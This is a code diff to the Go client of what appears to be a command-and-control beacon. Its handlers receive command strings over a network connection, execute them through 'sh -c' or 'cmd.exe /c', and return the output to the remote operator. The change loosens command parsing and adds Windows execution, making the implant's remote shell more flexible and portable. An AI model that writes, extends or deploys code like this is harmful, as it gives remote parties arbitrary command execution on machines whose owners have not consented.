@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"src/Client/generic/logger"
 	"src/Client/session/protocol"
 	"strings"
@@ -20,30 +21,44 @@ func BeaconShellCommand(command string) (string, error) {
 
 	var commandStr string
 
-	// Try to unmarshal as a map first
-	var cmdData map[string]interface{}
-	if json.Valid([]byte(command)) {
-		if err := json.Unmarshal([]byte(command), &cmdData); err == nil {
-			// Only handle if "command" key exists
-			if val, ok := cmdData["command"]; ok {
-				if commandStr, ok = val.(string); !ok || commandStr == "" {
-					logger.Error("Received empty or invalid command data.")
-					return "", fmt.Errorf("error: received empty or invalid command data")
+	// Support both JSON objects with a "command" field and raw/JSON string payloads like "pwd".
+	raw := strings.TrimSpace(command)
+	if raw == "" {
+		logger.Error("Received empty command string.")
+		return "", fmt.Errorf("error: received empty command string")
+	}
+
+	if json.Valid([]byte(raw)) {
+		var any interface{}
+		if err := json.Unmarshal([]byte(raw), &any); err == nil {
+			switch v := any.(type) {
+			case map[string]interface{}:
+				if val, ok := v["command"]; ok {
+					if s, ok := val.(string); ok && strings.TrimSpace(s) != "" {
+						commandStr = s
+					} else {
+						logger.Error("Received empty or invalid 'command' value in JSON object.")
+						return "", fmt.Errorf("error: received empty or invalid 'command' value in JSON object")
+					}
+				} else {
+					logger.Error("JSON does not contain 'command' key.")
+					return "", fmt.Errorf("error: JSON does not contain 'command' key")
 				}
-			} else {
-				logger.Error("JSON does not contain 'command' key.")
-				return "", fmt.Errorf("error: JSON does not contain 'command' key")
+			case string:
+				// JSON string payload, e.g., "pwd"
+				commandStr = v
+			default:
+				// Unsupported JSON type; fall back to trimming quotes
+				commandStr = strings.Trim(raw, "\"")
 			}
 		} else {
-			logger.Error(fmt.Sprintf("Failed to unmarshal command data: %v", err))
-			return "", fmt.Errorf("error: failed to unmarshal command data: %w", err)
+			// Shouldn't happen if json.Valid returned true, but be resilient.
+			logger.Log("JSON valid but unmarshal failed; treating as plain string.")
+			commandStr = strings.Trim(raw, "\"")
 		}
 	} else {
-		commandStr = strings.Trim(command, "\"")
-		if commandStr == "" {
-			logger.Error("Received empty command string.")
-			return "", fmt.Errorf("error: received empty command string")
-		}
+		// Not JSON; treat as plain string
+		commandStr = strings.Trim(raw, "\"")
 	}
 
 	logger.Log(fmt.Sprintf("Command to execute: %s", commandStr))
@@ -62,7 +77,14 @@ func RunShellCommand(commandStr string) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel() // Ensure the context is cancelled to release resources.
 
-	cmd := exec.CommandContext(ctx, "sh", "-c", commandStr)
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		// Use the native Windows shell
+		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", commandStr)
+	} else {
+		// POSIX shells
+		cmd = exec.CommandContext(ctx, "sh", "-c", commandStr)
+	}
 
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
@@ -172,5 +194,4 @@ func ShellHandler(conn net.Conn) {
 		protocol.SendData(conn, []byte(output))
 	}
 	logger.Log("Shell handler finished.")
-	return
 }
